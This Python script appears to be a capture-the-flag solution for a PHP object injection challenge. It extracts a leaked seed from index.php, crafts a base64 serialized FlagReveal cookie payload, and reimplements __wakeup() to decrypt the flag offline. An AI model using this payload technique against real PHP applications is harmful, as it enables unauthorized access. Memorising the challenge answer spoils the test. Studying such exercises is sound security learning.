#!/usr/bin/env python3
"""PHP object injection: craft a FlagReveal cookie and reproduce __wakeup().

Offline. The captured cookie is a guest Session. Because unserialize() has no
class allowlist, we can supply a serialized FlagReveal object instead; its
__wakeup() decrypts the sealed flag with a keystream keyed on $seed (the
maintenance seed leaked in index.php). We reimplement that decrypt here.
"""

import base64
import hashlib
import os
import re

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SRC = open(os.path.join(ROOT, "index.php")).read()


def leaked_seed() -> str:
    return re.search(r'\$SEED = "([^"]+)"', SRC).group(1)


def sealed_hex() -> str:
    return re.search(r'\$sealed_hex = "([0-9a-f]+)"', SRC).group(1)


def craft_injection(seed: str) -> str:
    # The serialized payload an attacker would place in the `sess` cookie.
    body = 'O:10:"FlagReveal":1:{s:4:"seed";s:%d:"%s";}' % (len(seed), seed)
    return base64.b64encode(body.encode()).decode()


def wakeup_decrypt(seed: str, ct: bytes) -> str:
    out = bytearray()
    for i, b in enumerate(ct):
        blk = i // 16
        ks = hashlib.md5(f"{seed}:{blk}".encode()).digest()
        out.append(b ^ ks[i % 16])
    return out.decode()


def main() -> None:
    captured = base64.b64decode(
        open(os.path.join(ROOT, "session_cookie.b64")).read().strip()
    )
    assert b'role";s:5:"guest"' in captured, "expected a guest session cookie"

    seed = leaked_seed()
    _ = craft_injection(seed)  # this is what we would send as the sess cookie

    flag = wakeup_decrypt(seed, bytes.fromhex(sealed_hex()))
    print(flag)


if __name__ == "__main__":
    main()
